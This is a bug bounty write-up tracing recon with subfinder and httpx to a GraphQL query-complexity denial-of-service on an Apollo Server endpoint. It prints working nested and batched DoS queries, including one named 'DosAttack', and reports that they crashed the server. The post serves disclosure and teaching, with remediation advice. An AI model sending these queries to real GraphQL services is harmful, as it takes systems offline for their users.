---
layout: post
title: "From Subdomain Enum to GraphQL DoS: A Bug Hunter's Journey"
date: 2024-03-21
tags: [Api, DOS, High]
excerpt: "A journey from basic subdomain enumeration to discovering a critical GraphQL denial-of-service vulnerability. What started as routine reconnaissance with subfinder and httpx evolved into custom tool development, systematic fuzzing, and ultimately finding a server-crushing query complexity exploit that earned a bounty."
---

A journey from basic subdomain enumeration to discovering a critical GraphQL DoS vulnerability through systematic fuzzing and custom tooling.

*Me: "Just checking some subdomains"*  
*GraphQL: "I'm about to end this server's whole career"*

## TL;DR

Found a critical DoS vulnerability in a GraphQL endpoint through systematic enumeration and fuzzing. Started with basic subdomain discovery, identified interesting endpoints with httpx, built custom tooling to detect GraphQL instances, and discovered a query complexity attack vector.

**Severity:** High  
**Impact:** Denial of Service via GraphQL query complexity  
**Bounty:** $$$ 💰

---

## Initial Reconnaissance

### Step 1: Subdomain Enumeration

Started with the classic approach using Subfinder to gather all subdomains:

```bash
subfinder -d domain.test -o domains.txt
```

**Result:** Got a decent list of subdomains to work with.

---

## HTTP Probing & Analysis

### Step 2: Deep HTTP Analysis with httpx

Time to see what's actually alive and interesting:

```bash
httpx -l domains.txt -favicon -fr -sc -tech-detect -bp
```

**Flags breakdown:**
- `-favicon` - Extract favicon hashes
- `-fr` - Follow redirects
- `-sc` - Show status codes
- `-tech-detect` - Detect technologies
- `-bp` - Extract body preview

### Interesting Findings

The results were quite revealing:

- **Majority:** 200 OK responses - standard endpoints, nothing unusual
- **Some 404s:** This caught my attention! 404s often indicate:
  - Hidden API endpoints
  - Undocumented routes
  - Interesting misconfigurations
  - Developer endpoints left exposed

<div align="center">
    <img src="https://images7.memedroid.com/images/UPLOADED577/61b6add70a737.jpeg" 
         alt="404" 
         style="width: 200px; height: auto;">
</div>
*When you see suspicious 404 endpoints*

---

## 🛠️ Custom GraphQL Discovery Tool

Standard tools weren't cutting it for detecting GraphQL endpoints across multiple domains efficiently. Time to build something custom.

### Step 3: Automated GraphQL Detection

run a Python script to hunt for GraphQL endpoints at scale:

```bash
python main.py -f domains.txt
```

**What the tool does:**
- Iterates through all discovered domains
- Sends introspection queries to common GraphQL paths
- Checks for Apollo Server signatures
- Validates GraphQL schema responses
- Outputs active GraphQL endpoints

### Jackpot!

```
[+] Found GraphQL endpoint: api.subdomain.domain.test/graphql
[+] Apollo Server detected!
[+] Introspection enabled ✓
```

**Apollo Server** - This is where things got interesting. Apollo has powerful features, but with great power comes... potential misconfigurations.

---

## The Fuzzing Journey

![Fuzzing Meme](https://miro.medium.com/v2/resize:fit:1000/format:webp/0*oPApgjOALQq77gym.jpg)
*"Let's just send a few queries" - Famous last words*

### Step 4: Operation Discovery & Enumeration

With introspection enabled, I could see the entire schema. Time to enumerate all available operations:

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
  }
}
```

**Discovery:** Found multiple query operations with nested relationships. Red flag for potential complexity attacks! 🚩

### Step 5: Query Complexity Testing

Started crafting queries with increasing complexity to test for depth and complexity limits:

**Simple query (baseline):**
```graphql
query {
  users {
    id
    name
  }
}
```
Response time: ~200ms

**Nested query (testing depth):**
```graphql
query {
  users {
    id
    name
    posts {
      id
      title
      comments {
        id
        author {
          id
          friends {
            id
            posts {
              comments {
                author {
                  friends {
                    posts {
                      id
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```
Response time: ~8 seconds 🤔

**Batch query (testing breadth):**
```graphql
query {
  a1: users { ...userFields }
  a2: users { ...userFields }
  a3: users { ...userFields }
  # ... repeated 50 times
  a50: users { ...userFields }
}

fragment userFields on User {
  id
  name
  posts {
    comments {
      author {
        friends {
          id
        }
      }
    }
  }
}
```
Response time: **45+ seconds** ⚠️

### Step 6: The Breaking Point

Combined both techniques - deep nesting with query batching:

```graphql
query DosAttack {
  batch1: users {
    posts {
      comments {
        author {
          friends {
            posts {
              comments {
                author {
                  friends {
                    posts {
                      comments {
                        id
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  # Repeated 20 times with slight variations
  batch2: users { ... }
  batch3: users { ... }
  # ...
}
```

**Result:** Server timeout after 120 seconds. CPU usage spiked to 100%. Server became unresponsive. 💥

---

## 🎯 Vulnerability Analysis

### Root Cause

The GraphQL server had **no query complexity limits** implemented:

1. No depth limiting
2. No complexity analysis
3. No query cost calculation
4. No rate limiting
5. No timeout configuration

### Attack Vector

An attacker could:
- Send deeply nested queries causing exponential database joins
- Batch multiple expensive queries in one request
- Bypass standard rate limiting (one HTTP request = one "request")
- Cause resource exhaustion with minimal effort

### Impact

- **Availability:** Server DoS, affecting all users
- **Resource Exhaustion:** Database connection pool depletion
- **Cascading Failures:** Backend services dependent on this API would fail
- **Business Impact:** Service downtime during attacks

---

---
## Timeline

- **Day 1:** Subdomain enumeration & HTTP probing
- **Day 2:** Run custom GraphQL detection tool
- **Day 3:** Started fuzzing, operations, variable
- **Day 4:** Found vulnerable endpoint, Developed PoC, documented findings
- **Day 4:** Submitted report
- **Day 7:** Triaged as High severity
- **Day 8:** Fix deployed
- **Day 8:** Bounty awarded 💰

---

## Lessons Learned

1. **404s are interesting** - Don't ignore them, they often lead to hidden endpoints
2. **Custom tools pay off** - Sometimes you need to build your own scanners
3. **GraphQL needs special attention** - Default configs are often insecure
4. **Complexity matters** - It's not always about finding SQLi or XSS
5. **Be systematic** - Enumeration → Detection → Analysis → Exploitation

<div align="center">
    <img src="https://media1.tenor.com/m/2vHljP-diQQAAAAC/rich-king.gif" 
         alt="S3 Domain Revealed" 
         style="width: 300px; height: auto;">
</div>
*When the bounty hits your account*

---

## 🔗 References

- [GraphQL Security Best Practices](https://graphql.org/learn/best-practices/)
- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [Apollo Server Security](https://www.apollographql.com/docs/apollo-server/security/authentication/)

---

## Final Thoughts

This finding reinforced an important lesson: **modern applications need modern security testing**. GraphQL is powerful, but with that power comes complexity that needs proper security controls. Always test for:

- Query depth limits
- Query complexity limits
- Batch query limits
- Proper rate limiting
- Resource timeouts

Happy hunting! 🎯🐛

---

*Disclaimer: This writeup is for educational purposes. All testing was performed on authorized targets with proper permissions through official bug bounty programs.*